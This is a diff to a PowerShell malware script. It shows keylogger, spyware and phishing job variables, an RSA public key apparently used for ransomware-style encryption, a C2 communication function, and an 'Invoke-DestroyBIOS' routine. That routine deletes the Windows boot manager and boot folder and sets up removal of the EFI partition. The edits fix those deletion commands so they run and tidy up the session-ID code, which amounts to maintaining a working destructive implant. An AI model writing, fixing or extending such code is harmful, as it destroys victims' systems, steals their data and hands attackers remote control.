@@ -55,7 +55,7 @@ function Save-SessionId {
     }
     catch {}
 }
-function Load-SessionId {
+function Read-SessionId {
     try {
         if (Test-Path $sessionRegPath) {
             $id = Get-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $sessionRegValue
@@ -78,19 +78,6 @@ $Script:LockdownActive = $false
 $Script:KeyloggerJob = $null
 $Script:SpywareJob = $null
 $Script:PhishingJob = $null
-
-# ============ RSA PUBLIC KEY (GANTI DENGAN PUBLIC KEY ANDA) ============
-$RsaPublicKey = @"
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoPjdX2l+XlDMYvFDJDx9
-ZpsqAkAT1yf4rG8WoDW2UReMu/ltiQPblPRZm8ICXakmMUSzyBwvC14YrtEu1gIl
-oweUPhezpqk0m77HYgeJHTBUU7sLAh/lsmnYUXvtHmUclsCSNCnPUQUej7IZa9Ap
-vuiWI1YixQvSRAa3c+BEpjhInh5QMLSsSUqwr4LmQdfe4I9b/ZuGQ3ZMtsX6azZ8
-JABv/GtKkuJrD7CHUHHGWB+Na3a66etNVtlI5zpz2/ZBS0cnBP9PqByPaBh8Xg/n
-czycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZP
-PwIDAQAB
------END PUBLIC KEY-----
-"@
 
 $RsaPublicKeyXml = "<RSAKeyValue><Modulus>oPjdX2l+XlDMYvFDJDx9ZpsqAkAT1yf4rG8WoDW2UReMu/ltiQPblPRZm8ICXakmMUSzyBwvC14YrtEu1gIloweUPhezpqk0m77HYgeJHTBUU7sLAh/lsmnYUXvtHmUclsCSNCnPUQUej7IZa9ApvuiWI1YixQvSRAa3c+BEpjhInh5QMLSsSUqwr4LmQdfe4I9b/ZuGQ3ZMtsX6azZ8JABv/GtKkuJrD7CHUHHGWB+Na3a66etNVtlI5zpz2/ZBS0cnBP9PqByPaBh8Xg/nczycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZPPw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
 
@@ -857,8 +844,8 @@ function Invoke-DestroyBIOS {
         takeown /f C:\bootmgr 2>&1 | Out-Null
         icacls C:\bootmgr /grant administrators:F 2>&1 | Out-Null
         attrib -r -s -h C:\bootmgr 2>&1 | Out-Null
-        del /f /q C:\bootmgr 2>&1 | Out-Null
-        rd /s /q C:\Boot 2>&1 | Out-Null
+        cmd /c del /f /q C:\bootmgr 2>&1 | Out-Null
+        cmd /c rd /s /q C:\Boot 2>&1 | Out-Null
         
         # 3. Hapus partisi EFI (jika ada) menggunakan diskpart
         $diskpartScript = @"
@@ -925,7 +912,7 @@ function Start-C2Communication {
 
 function Invoke-Main {
     # Load or create session ID (disimpan di registry)
-    $loadedId = Load-SessionId
+    $loadedId = Read-SessionId
     if ($loadedId -and $loadedId -ne "") {
         $Script:SessionId = $loadedId
     }
